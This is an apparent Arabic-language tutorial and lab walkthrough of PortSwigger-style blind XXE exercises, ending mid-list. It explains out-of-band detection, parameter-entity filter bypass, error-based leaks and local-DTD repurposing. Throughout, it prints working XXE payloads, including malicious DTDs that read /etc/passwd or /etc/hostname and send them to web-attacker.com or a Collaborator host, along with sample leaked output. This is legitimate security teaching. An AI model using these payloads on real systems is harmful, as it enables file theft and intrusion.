+<h3 id="2-define-the-external-entity">💣 الخطوة 2: زرع رابط الكولابوريتور (Define the External Entity)</h3>
+<ul>
+<li><strong>ماذا تفعل:</strong> هتيجي في الـ XML، وتحديداً بين السطر الأول (XML declaration) وبداية التاج الرئيسي للـ <code>&lt;stockCheck&gt;</code>، وتحط الكود ده:</li>
+</ul>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN&quot;&gt; ]&gt;
+</code></pre>
+<ul>
+<li><strong>💡 تلميح للمحترفين:</strong> بدل ما تكتب رابط الـ Collaborator بنفسك، اقف بالماوس في المكان اللي عاوز تحط فيه الرابط، واضغط <strong>Right-click</strong> واختار <strong>"Insert Collaborator payload"</strong>. برنامج Burp هيحطلك رابط فرعي (Subdomain) فريد وخاص بيك فوراً.</li>
+</ul>
+<h3 id="3-trigger-the-payload">🚀 الخطوة 3: تفعيل الهجوم (Trigger the Payload)</h3>
+<ul>
+<li><strong>ماذا تفعل:</strong> انزل تحت عند التاج بتاع <code>&lt;productId&gt;</code>، امسح الرقم المكتوب جواه (مثلاً لو مكتوب 1 أو 2)، وحط مكانه الـ Entity اللي إنت لسه معرّفه فوق:</li>
+</ul>
+<p>Plaintext</p>
+<pre><code>&amp;xxe;
+</code></pre>
+<ul>
+<li><strong>الحالة الآن:</strong> اضغط على زرار <strong>Send</strong> عشان تبعت الطلب المعدل للسيرفر.</li>
+</ul>
+<h3 id="4-poll-for-interactions">👁️ الخطوة 4: التحقق وصيد الاتصال (Poll for Interactions)</h3>
+<ul>
+<li>
+<p><strong>ماذا تفعل:</strong> روح للتبويب (Tab) الخاص بـ <strong>Collaborator</strong> في أعلى برنامج Burp Suite.</p>
+</li>
+<li>
+<p>اضغط على زرار <strong>"Poll now"</strong>.</p>
+</li>
+<li>
+<p><strong>النتيجة:</strong> هتظهر قدامك في الجدول سطور بتأكد إن في اتصالات من نوع <strong>DNS</strong> و <strong>HTTP</strong> جات للرابط بتاعك.</p>
+</li>
+</ul>
+<blockquote>
+<h3 id="behind-the-scenes">🧠 فكرة العمل (Behind the Scenes) عشان تفهمها لنفسك:</h3>
+<p>لما السيرفر استقبل ملف الـ XML وقرأ المتغير <code>&amp;xxe;</code>، راح بص في الـ DTD فوق، لقى إن قيمته محتاجة إنه يروح يزور رابط الـ Burp Collaborator. السيرفر نفذ الأمر ده في الخلفية وخرج على الإنترنت عشان يكلم الرابط بتاعك. بمجرد ما السيرفر زار موقعك، برنامج Burp سجل الزيارة دي، وده الدليل القاطع (PoC) على إن السيرفر مصاب بـ <strong>Blind XXE</strong> وبينفذ أوامر خارجية.</p>
+</blockquote>
+<hr />
+<h3 id="bypass-techniques">Bypass Techniques :</h3>
+<h3 id="_5">المشكلة: ليه الهجوم العادي ممكن يفشل؟</h3>
+<p>ساعات المبرمج أو الـ Firewall (WAF) بيكونوا أذكياء شوية، فبيعملوا فلترة (Validation) بتمنع استخدام الكيانات العادية (Regular Entities زي <code>&amp;xxe;</code>) جوه تاجات البيانات (زي <code>&lt;productId&gt;</code>). أو أحياناً الـ XML Parser نفسه بيكون متقفل وميسمحش إنك تستدعي كيان خارجي جوه هيكل الـ XML.</p>
+<h3 id="xml-parameter-entities">💡 الحل السحري: الـ XML Parameter Entities</h3>
+<p>لغة الـ XML فيها نوع "خاص جداً" من المتغيرات اسمه <strong>Parameter Entities</strong>. النوع ده له ميزة وقاعدة واحدة صارمة: <strong>لا يمكن استخدامه أو استدعائه إلا جوه منطقة الـ DTD بس</strong> (يعني جوه تاج الـ <code>&lt;!DOCTYPE&gt;</code> فوق خالص)، ومينفعش تستخدمه تحت وسط البيانات.</p>
+<p>عشان تستخدم النوع ده، في اختلافين بُساط جداً في طريقة الكتابة:</p>
+<ol>
+<li>
+<p><strong>في التعريف (Declaration):</strong> بنحط علامة النسبة المئوية <code>%</code> قبل اسم المتغير.</p>
+<ul>
+<li>
+<p><em>الشكل العادي:</em> <code>&lt;!ENTITY xxe ...&gt;</code></p>
+</li>
+<li>
+<p><em>الشكل الجديد:</em> <code>&lt;!ENTITY % xxe ...&gt;</code></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>في الاستدعاء (Referencing):</strong> بدل ما نستخدم علامة <code>&amp;</code>، بنستخدم علامة <code>%</code>.</p>
+<ul>
+<li>
+<p><em>الشكل العادي:</em> <code>&amp;xxe;</code></p>
+</li>
+<li>
+<p><em>الشكل الجديد:</em> <code>%xxe;</code></p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="the-payload_2">🚀 كيف تنفذ الهجوم؟ (The Payload)</h3>
+<p>بما إننا مش هنقدر ننزل تحت عند الـ <code>&lt;productId&gt;</code> ونكتب <code>&amp;xxe;</code>، إحنا هننفذ الهجوم بالكامل <strong>فوق جوه الـ DTD</strong>.</p>
+<p>شوف الـ Payload ده:</p>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN&quot;&gt; %xxe; ]&gt;
+</code></pre>
+<p><strong>إيه اللي بيحصل هنا بالظبط؟</strong></p>
+<ol>
+<li>
+<p>إنت فتحت الـ <code>&lt;!DOCTYPE&gt;</code> وعرفت الـ Parameter Entity اللي اسمه <code>%xxe</code>، وقولتله روح للموقع بتاعك (Burp Collaborator).</p>
+</li>
+<li>
+<p><strong>الضربة القاضية:</strong> قبل ما تقفل القوس بتاع الـ DTD <code>]</code>، قُمت كاتب <code>%xxe;</code>!</p>
+</li>
+<li>
+<p><strong>النتيجة:</strong> السيرفر وهو بيقرأ الـ DTD فوق، هيعرّف المتغير، وبعدين يلاقيك بتستدعيه في نفس السطر، فهيقوم رايح فوراً فاتح الرابط بتاعك.</p>
+</li>
+</ol>
+<p><strong>ليه الحيلة دي عبقرية؟</strong> لأنك مش محتاج تعدل أي حاجة في التاجات اللي تحت (زي <code>&lt;productId&gt;</code>). الهجوم كله بيتم ويخلص في السطر الأول قبل ما السيرفر يكمل قراءة باقي بيانات الـ XML، وبكده إنت بتتخطى الفلترة اللي بتحمي البيانات!</p>
+<hr />
+<h3 id="blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">حل لاب Blind XXE with out-of-band interaction via XML parameter entities :</h3>
+<p>هو هو نفس حل اللاب الفات بس المختلف اننا علشان في WAF او Firewall فا الطريقة الطبيعية مش هتنفع يعني مش هينفع انزل اكتب ال variable تحت في ال tags علشان كده بستخدم ال  Parameter Entities variables و ال Declaration جوه ال DTD ال هو ال DOCTYPE TAG بنعدل بس ال  Payload و هنغليه كده :</p>
+<pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;https://ytvrfcha409hiee0rp1v580okfq6ex2m.oastify.com&quot;&gt; %xxe; ]&gt;
+</code></pre>
+<p>و بكده السيرفر وهو بيقرأ الـ DTD فوق، هيعرّف المتغير، وبعدين يلاقيك بتستدعيه في نفس السطر، فهيقوم رايح فوراً فاتح الرابط بتاعك.
+و يتسجل ال logs في COLLABORATOR.</p>
+<hr />
+<h3 id="exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Exploiting blind XXE to exfiltrate data out-of-band :</h3>
+<p>بص يا سيدي، في الجزء اللي فات إحنا بس أثبتنا إن السيرفر مصاب، لكن عشان نخليه يبعتلنا محتوى ملف زي <code>etc/passwd/</code>، إحنا محتاجين نعمل <strong>"خطة مركبة" (Chain)</strong>. مش هينفع نكتب الكود كله في الطلب اللي بنبعته للسيرفر (الـ Internal DTD)، لأن الـ XML Parser مش هيسمحلك تحط متغير جوه رابط متغير تاني بشكل مباشر.</p>
+<p><strong>الحل؟</strong> بنعمل ملف DTD خبيث ونرفعه على سيرفر بتاعنا إحنا، ونخلي السيرفر المصاب يقرأه وينفذ اللي جواه!</p>
+<p>تعالى نفصص الخطة دي لخطوتين زي ما المقال شرحها:</p>
+<h3 id="_6">😈 الخطوة الأولى: تجهيز الفخ (الملف الخبيث على سيرفرك)</h3>
+<p>إنت هتعمل ملف وتسميه مثلاً <code>malicious.dtd</code> وترفعه على موقعك (أو على Burp Collaborator لو بيدعم الاستضافة). الملف ده جواه 4 سطور عبقرية، بتشتغل زي "عرائس الماتريوشكا" الروسية (واحدة جوه التانية):</p>
+<p>XML</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;&quot;&gt;
+%eval;
+%exfiltrate;
+</code></pre>
+<p><strong>شرح السطور دي للسيرفر:</strong></p>
+<ol>
+<li>
+<p><strong>السطر الأول (<code>file</code>):</strong> "روح اقرأ ملف الباسوردات وخزن محتواه في المتغير اللي اسمه <code>file</code>."</p>
+</li>
+<li>
+<p><strong>السطر التاني (<code>eval</code>):</strong> ده المطبخ! هنا إحنا بنعمل متغير جديد اسمه <code>eval</code>، وظيفته إنه <strong>يصنع</strong> متغير تالت اسمه <code>exfiltrate</code>. المتغير التالت ده بيحتوي على رابط موقعك، ومترزوق في آخره <code>?x=%file;</code> (يعني بنلزق محتوى ملف الباسوردات في الرابط).</p>
+<ul>
+<li><em>(ملاحظة: <code>&amp;#x25;</code> ده مجرد تشفير لعلامة النسبة المئوية <code>%</code> عشان السيرفر ميتلخبطش وهو بيقرأ الكود في الأول).</em></li>
+</ul>
+</li>
+<li>
+<p><strong>السطر التالت (<code>%eval;</code>):</strong> "شغّل سطر المطبخ عشان تصنع المتغير التالت."</p>
+</li>
+<li>
+<p><strong>السطر الرابع (<code>%exfiltrate;</code>):</strong> "شغّل بقى المتغير التالت." وده اللي بيخلي السيرفر فعلياً يفتح رابط موقعك، ويبعتلك محتوى الملف كـ Parameter في الرابط!</p>
+</li>
+</ol>
+<h3 id="the-payload_3">🚀 الخطوة الثانية: إطلاق شرارة الهجوم (The Payload)</h3>
+<p>دلوقتي الفخ جاهز على سيرفرك. كل اللي هتعمله إنك هتروح للسيرفر المصاب (في Burp Suite)، وتبعتله الـ Payload البسيط ده:</p>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://web-attacker.com/malicious.dtd&quot;&gt; %xxe;]&gt;
+</code></pre>
+<p><strong>إيه اللي هيحصل هنا؟ (The Chain Reaction):</strong></p>
+<ol>
+<li>
+<p>السيرفر المصاب هيشوف الأمر، هيروح يزور موقعك عشان يحمل ملف <code>malicious.dtd</code>.</p>
+</li>
+<li>
+<p>السيرفر هيدخل جوه الملف بتاعك ويبدأ ينفذ السطور الـ 4 اللي شرحناهم.</p>
+</li>
+<li>
+<p>هيقرأ ملف الـ <code>passwd</code> من على جهازه هو.</p>
+</li>
+<li>
+<p>هيحط محتوى الملف جوه الرابط بتاعك.</p>
+</li>
+<li>
+<p>هيقوم باعتلك طلب (HTTP Request) شكله كده: <code>[http://web-attacker.com/?x=root:x:0:0:root](http://web-attacker.com/?x=root:x:0:0:root)...</code></p>
+</li>
+</ol>
+<p>إنت بقى تفتح الـ Logs بتاعة سيرفرك، تلاقي محتوى الملف كله مبعوتلك في الرابط! 🎯</p>
+<h3 id="the-catch">⚠️ ملاحظة هامة جداً للمحترفين (The Catch):</h3>
+<p>المقال ذكر نقطة في غاية الأهمية في الآخر: لو الملف اللي بتسرقه (زي <code>etc/passwd/</code>) مليان سطور كتير تحت بعض (Newlines)، أحياناً الطلب بيفشل ومبيوصلكش. ليه؟ لأن الـ XML Parser ساعات بيرفض يحط سطور جديدة (Enter) جوه رابط HTTP (الرابط بيبوظ).</p>
+<p><strong>الحل لو واجهت المشكلة دي في الواقع:</strong></p>
+<ol>
+<li>
+<p><strong>استهدف ملف سطر واحد:</strong> جرب تسرق ملف مفيهوش سطور كتير زي <code>etc/hostname/</code> (بيجيبلك اسم السيرفر) عشان تتأكد إن الثغرة شغالة.</p>
+</li>
+<li>
+<p><strong>غيّر البروتوكول:</strong> بدل ما تخلي السيرفر يبعتلك البيانات عبر <code>http://</code>، خليه يبعتهالك عبر <code>ftp://</code>، لأن الـ FTP بيتعامل مع السطور المتعددة أحسن بكتير في بعض الـ Parsers.</p>
+</li>
+</ol>
+<hr />
+<h3 id="exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">حل لاب Exploiting blind XXE to exfiltrate data using a malicious external DTD :</h3>
+<p><strong>الهدف:</strong> إجبار السيرفر المصاب إنه يقرأ ملف داخلي (<code>/etc/hostname</code>) ويبعته لسيرفر خارجي بنتحكم فيه (Burp Collaborator)، عن طريق استدعاء ملف DTD خبيث من سيرفر تاني بنتحكم فيه برضه (Exploit Server).</p>
+<p>هنا إحنا بنتعامل مع <strong>3 أطراف</strong>: السيرفر المصاب، سيرفر الاستضافة بتاعنا (Exploit Server)، وسيرفر الاستقبال (Collaborator).</p>
+<h3 id="collaborator">المرحلة الأولى: تجهيز سيرفر الاستقبال (Collaborator)</h3>
+<ol>
+<li>
+<p>افتح <strong>Burp Suite</strong> وروح لتبويب <strong>Collaborator</strong>.</p>
+</li>
+<li>
+<p>اضغط على <strong>"Copy to clipboard"</strong>. الخطوة دي بتولد لك رابط فريد (Subdomain) خاص بيك، وده اللي السيرفر المصاب هيبعت عليه البيانات المسروقة.</p>
+</li>
+</ol>
+<h3 id="exploit-server">المرحلة الثانية: تجهيز الفخ (Exploit Server)</h3>
+<p>في الخطوة دي، إحنا بنصنع الـ DTD الخبيث اللي السيرفر المصاب هيقرأه وينفذ اللي جواه.</p>
+<ol>
+<li>
+<p>روح للـ <strong>Exploit Server</strong> اللي اللاب موفرهولك.</p>
+</li>
+<li>
+<p>في خانة الـ Body، حط الكود ده:</p>
+</li>
+</ol>
+<p>XML</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'&gt;&quot;&gt;
+%eval;
+%exfil;
+</code></pre>
+<p>_ متنساش تبدل <code>BURP-COLLABORATOR-SUBDOMAIN</code> بالرابط اللي نسخته من شوية)._ 3. اضغط <strong>Store</strong> عشان تحفظ الملف على السيرفر، وبعدين اضغط <strong>View exploit</strong> وانسخ الرابط بتاع الصفحة دي (ده الرابط اللي هنبعته للسيرفر المصاب عشان يدخل يقرأ منه الأوامر).</p>
+<p>** إيه اللي بيحصل في الكود ده؟**</p>
+<ul>
+<li>
+<p><code>% file</code>: بيقرأ محتوى ملف <code>hostname</code>.</p>
+</li>
+<li>
+<p><code>% eval</code>: بيصنع متغير جديد بيحط جواه رابط الكولابوريتور بتاعك، وبيلزق في آخره محتوى الملف.</p>
+</li>
+<li>
+<p><code>%eval;</code> و <code>%exfil;</code>: بينفذوا المتغيرات دي عشان الطلب يتبعت فعلياً.</p>
+</li>
+</ul>
+<h3 id="the-vulnerable-app">المرحلة الثالثة: إطلاق الهجوم (The Vulnerable App)</h3>
+<p>دلوقتي الفخ جاهز ومرفوع على الإنترنت، ناقص بس نوجه السيرفر المصاب ليه.</p>
+<ol>
+<li>
+<p>روح لموقع اللاب (المتجر)، واضغط على زرار <strong>"Check stock"</strong> لأي منتج.</p>
+</li>
+<li>
+<p>اصطاد الطلب (Intercept) في Burp Suite، وابدله للـ Repeater.</p>
+</li>
+<li>
+<p>حط الكود ده تحت الـ <code>&lt;?xml...&gt;</code> وفوق الـ <code>&lt;stockCheck&gt;</code>:</p>
+</li>
+</ol>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;YOUR-DTD-URL&quot;&gt; %xxe;]&gt;
+</code></pre>
+<p>_ بدل <code>YOUR-DTD-URL</code> برابط الـ Exploit Server اللي نسخته في المرحلة التانية)._ 4. اضغط <strong>Send</strong>.</p>
+<p>** إيه اللي بيحصل هنا؟** السيرفر المصاب هيشوف الـ Parameter Entity (<code>% xxe</code>)، هيروح يزور رابط الـ Exploit Server، هيقرا الـ 4 سطور اللي كتبناهم هناك، وهينفذهم ورا بعض (يقرأ الملف، يحطه في الرابط، ويبعته للكولابوريتور).</p>
+<h3 id="_7">المرحلة الرابعة: حصد الغنائم</h3>
+<p>السيرفر المصاب مش هيرد عليك في المتصفح بأي حاجة (عشان كده اسمه Blind). البيانات راحت على الكولابوريتور.</p>
+<ol>
+<li>
+<p>ارجع لتبويب <strong>Collaborator</strong> في Burp Suite.</p>
+</li>
+<li>
+<p>اضغط <strong>Poll now</strong> (عشان تسحب أي تحديثات أو اتصالات جديدة وصلتك).</p>
+</li>
+<li>
+<p>هتلاقي اتصالات من نوع <strong>HTTP</strong>. اضغط على واحد فيهم وبص على تفاصيل الـ Request.</p>
+</li>
+<li>
+<p>هتلاقي السيرفر المصاب باعت طلب شكله كده: <code>GET /?x=YOUR_HOSTNAME_HERE HTTP/1.1</code>.</p>
+</li>
+<li>
+<p>الكلمة اللي مكتوبة بعد <code>?x=</code> هي دي محتوى ملف <code>/etc/hostname</code>! خدها، حطها في زرار حل اللاب (Submit solution).</p>
+</li>
+</ol>
+<hr />
+<h3 id="exploiting-blind-xxe-to-retrieve-data-via-error-messages">Exploiting blind XXE to retrieve data via error messages :</h3>
+<p>المرة دي إحنا بندخل على تكنيك مختلف تماماً وذكي جداً اسمه <strong>Error-Based Blind XXE</strong>.</p>
+<p>عشان تكون فاهم الصورة كاملة في شغلك كـ Pentester، أحياناً بتيجي تطبق طريقة الـ Out-of-Band (OAST) اللي لسه شارحينها وتلاقي إن مفيش أي اتصالات بتوصل للـ Collaborator بتاعك. ده غالباً معناه إن السيرفر وراه Firewall عنيف مانع أي اتصالات خارجية (Egress Filtering).</p>
+<p>هنا بيجي دور الخطة البديلة: <strong>إزاي نجبر السيرفر يقرأ الملف، ويفضحهولنا على الشاشة جوه رسالة خطأ (Error Message)؟</strong></p>
+<p>تعالى نفصص الكود الخبيث ده سطر سطر عشان تفهم "الخدعة" بتتم إزاي:</p>
+<h3 id="dtd">😈 الفخ (ملف الـ DTD الخبيث)</h3>
+<p>XML</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;&quot;&gt;
+%eval;
+%error;
+</code></pre>
+<p><strong>إيه اللي بيحصل هنا بالظبط؟</strong></p>
+<ol>
+<li>
+<p><strong><code>% file</code></strong>: ده السطر العادي بتاعنا. بنأمر السيرفر يروح يقرأ ملف الباسوردات <code>/etc/passwd</code> ويخزن محتواه جوه المتغير اللي اسمه <code>file</code>.</p>
+</li>
+<li>
+<p><strong><code>% eval</code></strong>: هنا بتبدأ الخباثة! بنعمل متغير جديد بيصنع متغير تالت اسمه <code>error</code>. المتغير التالت ده بيطلب من السيرفر إنه يروح يقرأ ملف من مسار غريب جداً: <code>file:///nonexistent/</code> وبنلزق في آخره محتوى ملف الباسوردات (<code>%file;</code>).</p>
+</li>
+<li>
+<p><strong><code>%eval;</code></strong>: بنشغل سطر المطبخ عشان يتم تعريف المتغير <code>error</code> بشكل رسمي.</p>
+</li>
+<li>
+<p><strong><code>%error;</code></strong>: بننفذ المتغير الأخير، وهنا بتيجي الضربة القاضية!</p>
+</li>
+</ol>
+<h3 id="the-crash">💥 لحظة الانفجار (The Crash)</h3>
+<p>لما السيرفر ييجي ينفذ السطر الأخير، هيلاقي نفسه مطالب إنه يفتح مسار أو ملف على الهارد ديسك شكله عامل كده: <code>file:///nonexistent/root:x:0:0:root:/root:/bin/bash...</code></p>
+<p>بالمنطق، مفيش فولدر على السيرفر اسمه <code>nonexistent</code>، ومفيش ملف اسمه طويل كده وعبارة عن محتوى الباسوردات! الـ XML Parser بتاع السيرفر "هيتجنن" وهيفشل إنه يلاقي الملف ده، فهيقوم مطلع رسالة خطأ (Exception) صريحة جداً يشتكي فيها ويقول:</p>
+<blockquote>
+<p><em>"أنا دورت على الملف اللي اسمه (كذا كذا كذا) ومالقيتوش!"</em></p>
+</blockquote>
+<p>وبما إن التطبيق أو الموقع اللي إنت بتختبره <strong>مصاب بإنه بيعرض أخطاء الـ XML للمستخدم في الـ Response</strong>، هتلاقي الرد اللي راجعلك في Burp Suite مليان بالبيانات دي:</p>
+<p>Plaintext</p>
+<pre><code>java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+</code></pre>
+<h3 id="_8">🎯 الخلاصة:</h3>
+<p>إنت هنا مش بتستنى السيرفر يبعتلك البيانات على سيرفر خارجي. إنت بتعمل "خطأ مُتعمد" بتدمج فيه البيانات السرية جوه اسم مسار وهمي، ولما السيرفر يشتكي إنه مش لاقي المسار ده، بيفضحلك البيانات السرية جوه نص الشكوى بتاعته (الـ Error Message).</p>
+<p>التكنيك ده ممتاز جداً، بس شرطه الوحيد إن الـ Web Application يكون بيطبع رسائل الخطأ التفصيلية (Verbose Errors) في وش المستخدم ومبيعملهاش إخفاء!</p>
+<hr />
+<h3 id="exploiting-blind-xxe-to-retrieve-data-via-error-messages_1">حل لاب Exploiting blind XXE to retrieve data via error messages :</h3>
+<p><strong>الهدف من اللاب:</strong> إجبار الـ XML Parser على قراءة ملف <code>/etc/passwd</code> ومحاولة فتحه كمكتبة أو مسار غير موجود (<code>/invalid/...</code>)، مما يسبب Crash للسيرفر فيطبع محتوى الملف جوه رسالة الخطأ في الـ Response.</p>
+<h3 id="1-exploit-server">🪤 الخطوة 1: تجهيز الفخ على الـ Exploit Server</h3>
+<ol>
+<li>
+<p>اضغط على زرار <strong>"Go to exploit server"</strong> في اللاب.</p>
+</li>
+<li>
+<p>في خانة الـ Body، هتحط ملف الـ DTD الخبيث ده زي ما هو:</p>
+</li>
+</ol>
+<p>XML</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;&quot;&gt;
+%eval;
+%exfil;
+</code></pre>
+<ol>
+<li>
+<p>اضغط على <strong>Store</strong> عشان تحفظ الملف.</p>
+</li>
+<li>
+<p>اضغط على <strong>View exploit</strong> وانسخ الرابط بتاع الصفحة (هيبقى شكله مثلاً: <code>https://exploit-xxxxx.exploit-server.net/exploit</code>).</p>
+</li>
+</ol>
+<blockquote>
+<p><strong>💡 التريكة هنا:</strong> السطر التاني بيطلب فتح ملف اسمه <code>/invalid/</code> ومضاف ليه محتوى ملف الباسوردات. السيرفر هيحاول يفتح المسار ده وهيفشل لأن المسار ده وهمي!</p>
+</blockquote>
+<h3 id="2-the-attack">🚀 الخطوة 2: توجيه ضربة الهجوم (The Attack)</h3>
+<ol>
+<li>
+<p>افتح صفحة أي منتج، واضغط <strong>"Check stock"</strong>.</p>
+</li>
+<li>
+<p>اصطاد الطلب (Intercept) في Burp Suite وابعت الطلب للـ <strong>Repeater</strong>.</p>
+</li>
+<li>
+<p>تعال تحت ديباجة الـ XML فوق وفوق التاج بتاع <code>&lt;stockCheck&gt;</code> وحط استدعاء الملف الخبيث بتاعك:</p>
+</li>
+</ol>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;YOUR-DTD-URL&quot;&gt; %xxe;]&gt;
+</code></pre>
+<p><em>(⚠️ استبدل <code>YOUR-DTD-URL</code> بالرابط اللي نسخته من الـ Exploit Server في الخطوة اللي فاتت).</em></p>
+<h3 id="3-response">💥 الخطوة 3: حصد الغنائم مباشرة في الـ Response</h3>
+<ol>
+<li>
+<p>اضغط <strong>Send</strong> في Burp Repeater.</p>
+</li>
+<li>
+<p>بص على شاشة الـ <strong>Response</strong> على اليمين، هتلاقي السيرفر مرجعلك Status Code عبارة عن <strong>500 Internal Server Error</strong> ومكتوب جواه رسالة الخطأ دي:</p>
+</li>
+</ol>
+<p>Plaintext</p>
+<pre><code>&quot;XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin...&quot;
+</code></pre>
+<p><strong>مبروك!</strong> إنت كده خليت السيرفر ينطق بالبيانات السرية غصب عنه جوه رسالة الخطأ، واللاب هيعلم معاك "Solved" فوراً! 🎯</p>
+<blockquote>
+<p><strong>🧠 فكرة جوهرية لـ Notes المقارنة عندك:</strong></p>
+<ul>
+<li>
+<p><strong>في الـ OAST (اللي فات):</strong> السيرفر كان أعمى + مبيطلعش أخطاء = سرقنا البيانات وبعتنا لـ Collaborator.</p>
+</li>
+<li>
+<p><strong>في الـ Error-Based (ده):</strong> السيرفر أعمى في البيانات بس بيطلع أخطاء = سرقنا البيانات جوه الـ Error Message ومحتجناش Collaborator.</p>
+</li>
+</ul>
+</blockquote>
+<hr />
+<h3 id="exploiting-blind-xxe-by-repurposing-a-local-dtd">Exploiting blind XXE by repurposing a local DTD :</h3>
+<p>إنت كده دخلت في مستوى الـ Ninjas الحقيقي في الـ XXE! التكنيك ده (اللي خده باحث اسمه Arseniy Sharoglazov واحتل بيه المركز السابع في أقوى تقنيات الاختراق سنة 2018) بيحل أسوأ كابوس ممكن يقابل أي Pentester.</p>
+<p>تعالى أحكيلك القصة من الأول ونفصص المشكلة والحل العبقري بتاعها:</p>
+<h3 id="firewall">🛑 الكابوس (الـ Firewall قفل كل حاجة)</h3>
+<p>تخيل إنك بتختبر سيرفر، والسيرفر ده:</p>
+<ol>
+<li>
+<p><strong>مانع الـ OAST:</strong> يعني مش عارف يكلم الـ Burp Collaborator بتاعك.</p>
+</li>
+<li>
+<p><strong>مانع استدعاء External DTD:</strong> يعني مش قادر يروح يقرأ ملف الـ <code>malicious.dtd</code> اللي إنت رافعه على الـ Exploit Server.</p>
+</li>
+</ol>
+<p><strong>هتقولي:</strong> "طب ما نكتب الكود الخبيث كله جوه الطلب نفسه (Internal DTD) ونخلص من غير ما نستدعي ملفات خارجية!" <strong>هقولك:</strong> قواعد لغة الـ XML (الـ Specification) بتمنع ده! ممنوع تستخدم Parameter Entity جوه Parameter Entity تاني في الـ Internal DTD. لو عملتها، الـ Parser هيطلع Error يقولك "Syntax Error" ومش هينفذ الهجوم.</p>
+<h3 id="the-xml-loophole">💡 الثغرة القانونية (The XML Loophole)</h3>
+<p>الهاكرز اكتشفوا ثغرة في قواعد لغة الـ XML نفسها! القاعدة بتقول: لو استخدمت DTD "مُهجن" (يعني كتبت كود جوه الطلب، وفي نفس الوقت استدعيت ملف DTD خارجي)، وقتها الـ Parser بيتلخبط و<strong>بيسمحلك تتجاهل قاعدة المنع</strong>، وتقدر تعرّف كيانات جوه بعضها براحتك!</p>
+<p>بس إحنا لسه عندنا مشكلة: السيرفر مش عارف يوصل للإنترنت عشان يجيب ملف DTD خارجي! <strong>الحل العبقري:</strong> هنخلي السيرفر يستدعي ملف DTD خارجي بس <strong>موجود أصلاً على الهارد ديسك بتاعه هو</strong> (Local DTD)!</p>
+<h3 id="repurposing">🪤 إزاي بننفذ الخدعة دي؟ (Repurposing)</h3>
+<p>الفكرة كلها إنك بتدور على أي ملف DTD شرعي موجود على سيرفر الضحية (مثلاً ملف خاص بإعدادات واجهة GNOME في اللينكس مساره <code>/usr/share/yelp/dtd/docbookx.dtd</code>). الملف الشرعي ده بيكون جواه متغيرات (Entities) متعرّفة جاهزة. إحنا بندخل "نعمل Override" أو <strong>نُعيد تعريف</strong> واحد من المتغيرات دي بالكود الخبيث بتاعنا!</p>
+<p><strong>بص على الـ Payload ده وركز في ترتيب الأحداث:</strong></p>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [
+&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+&lt;!ENTITY % custom_entity '
+&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+&amp;#x25;eval;
+&amp;#x25;error;
+'&gt;
+%local_dtd;
+]&gt;
+</code></pre>
+<p><strong>شرح الكود (المسرحية بتتم كالتالي):</strong></p>
+<ol>
+<li>
+<p><strong>السطر الأول (<code>local_dtd</code>):</strong> بنقول للسيرفر "لو سمحت جهز نفسك عشان هنقرأ ملف الـ <code>docbookx.dtd</code> اللي موجود عندك على الهارد".</p>
+</li>
+<li>
+<p><strong>السطر التاني (<code>custom_entity</code>):</strong> المتغير ده أصلاً موجود جوه ملف الـ <code>docbookx.dtd</code>. إحنا هنا بنسبق وبنقول للسيرفر: "أنا هعرّف المتغير ده على مزاجي، وهحط جواه كود الـ Error-Based اللي بيسرق ملف الباسوردات".</p>
+<ul>
+<li><em>(ملاحظة: الرموز الغريبة زي <code>&amp;#x25;</code> و <code>&amp;#x26;</code> دي مجرد تشفير لعلامة الـ <code>%</code> والـ <code>&amp;</code> عشان الـ Parser ما ينفذهمش بدري ويبوظ الكود).</em></li>
+</ul>
+</li>
+<li>
